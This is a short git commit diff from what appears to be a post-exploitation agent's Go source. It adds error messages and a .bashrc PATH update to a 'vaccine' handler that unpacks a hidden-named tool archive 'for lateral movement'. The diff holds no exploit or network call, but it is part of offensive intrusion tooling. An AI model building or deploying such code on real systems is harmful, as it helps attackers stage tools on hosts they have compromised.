e622104e2071dac2a8506e50c363a5699cc2447c
jm33-m0 <jm33.m0@gmail.com>
2021-01-09 16:17:13 +0800

    vaccine: update bashrc on installation

--- core/internal/agent/vaccine.go
+++ core/internal/agent/vaccine.go
@@ -5,6 +5,7 @@ install tools to UtilsPath, for lateral movement
 */
 
 import (
+	"fmt"
 	"log"
 	"os"
 
@@ -25,11 +26,19 @@ func vaccineHandler() string {
 	if !IsFileExist(UtilsPath) {
 		if err = os.MkdirAll(UtilsPath, 0700); err != nil {
 			log.Print(err)
-			return err.Error()
+			return fmt.Sprintf("mkdir: %v", err)
 		}
 	}
 	if err = archiver.Unarchive(AgentRoot+"/.vj8x8Verd.zip", UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
+		return fmt.Sprintf("Unarchive: %v", err)
+	}
+
+	// update PATH in .bashrc
+	err = AppendToFile(UtilsPath+"/.bashrc", fmt.Sprintf("export PATH=%s:$PATH", UtilsPath))
+	if err != nil {
+		log.Printf("Update bashrc: %v", err)
+		out = fmt.Sprintf("Update bashrc: %v", err)
 	}
 	return out
 }
